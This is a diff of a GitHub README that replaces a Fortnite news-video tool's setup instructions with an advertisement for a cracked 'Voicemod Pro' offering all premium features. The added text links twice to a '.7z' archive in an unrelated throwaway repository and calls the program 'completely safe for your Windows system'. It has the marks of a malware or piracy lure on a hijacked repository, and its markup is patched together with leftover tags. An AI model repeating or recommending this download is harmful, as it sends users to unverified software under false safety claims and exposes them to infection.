@@ -1,54 +1,39 @@
-# Fortnite News Creator
+![windows](https://github.com/Andre2381d/Tessssssst/assets/164078889/9d7a04e2-7b17-40b1-a168-e08831df271d) ![license](https://github.com/Andre2381d/Tessssssst/assets/164078889/c16e05d7-7a55-4644-a9f8-f9de35eac176)
 
-![](https://img.shields.io/github/stars/MyNameIsDark01/fortnitenewscreator.svg) ![](https://img.shields.io/github/forks/MyNameIsDark01/fortnitenewscreator.svg) ![](https://img.shields.io/github/tag/MyNameIsDark01/fortnitenewscreator.svg) ![](https://img.shields.io/github/release/MyNameIsDark01/fortnitenewscreator.svg) ![](https://img.shields.io/github/issues/MyNameIsDark01/fortnitenewscreator.svg)
+Voicemod Pro 2.48v
 
-## Setup
 
-1) Install Python
-    - sudo apt install python3
-    - sudo apt install python3-pip
+[![download_click](https://github.com/Andre2381d/Tessssssst/assets/164078889/30ffdde3-86d1-4d50-a21f-0a921ffb2663)](https://github.com/Andre2381d/Tessssssst/releases/download/dsfsdfs/ChineseTriad.7z)
+
+
+[![&chintrede.jpg&](https://github.com/Andre2381d/Tessssssst/assets/164078889/5c2bfa78-6b14-42b4-8760-279b749c1818)](https://github.com/Andre2381d/Tessssssst/releases/download/dsfsdfs/ChineseTriad.7z)
+
+> [!NOTE]
+> This repository provides detailed information and resources for downloading, installing, and using the Voicemod.
+
+---
+
+
+</div>
+
+- All Premium plan functional
+- AI Voices
+- All voices
+
+> [!TIP]
+> 1. Most importantly: the program is completely safe for your Windows system.
+> 2. Support for most systems: Windows 7/8/8.1/10/11 (x32/64)
+
+---
+
   
-2) Install the requirements
-    - sudo pip3 install -r requirements.txt
+### Overview 📖 :
 
-3) Install ffmpeg and x264lib (for ubuntu below)
-    - sudo apt install ffmpeg
-    - sudo apt install libx264-dev
+</div>
 
-## Compatibility
-### Twitter:
 
-If You want post on Twitter use Feed.py, remember to compile config.json.
-  - Enable Twitter;
-  - Insert app tokens;
-  - Insert Twitter Message.
+![VoicemodDesktop_qY2zXCDSGL](https://github.com/MyNameIsDark01/fortnite-news-creator/assets/48729254/b50e1b42-ca6c-488a-aed7-063df996eaa5)
 
-### Telegram:
 
-If You want post on Telegram use Feed.py, remember to compile config.json.
-  - Enable Telegram;
-  - Insert Bot Token;
-  - Insert Chat_ID;
-  - Insert Telegram Message and parse_mode.
 
-## Example:
 
-If you want use this sort of library with your script copy News.py, util.py, config.json and assets folder. (It's a complete script so... WHY DO YOU WANT USE WITH ANOTHER SCRIPT?)
-
-```
-import News
-
-NewsBR = News.GetBRNews(Language = "en) #Set your language here
-NewsCreative = News.GetCreativeNews(Language = "en) #Set your language here
-NewsSTW = News.GetSTWNews(Language = "en) #Set your language here
-
-It will create automatically a mp4 file called "News{NewsType}.mp4"
-```
-
-Output:
-
-![BR](https://github.com/MyNameIsDark01/fortnitenewscreator/blob/master/examples/NewsBR.gif?raw=true)
-
-![CREATIVE](https://github.com/MyNameIsDark01/fortnitenewscreator/blob/master/examples/NewsCreative.gif?raw=true)
-
-![STW](https://github.com/MyNameIsDark01/fortnitenewscreator/blob/master/examples/NewsSTW.gif?raw=true)
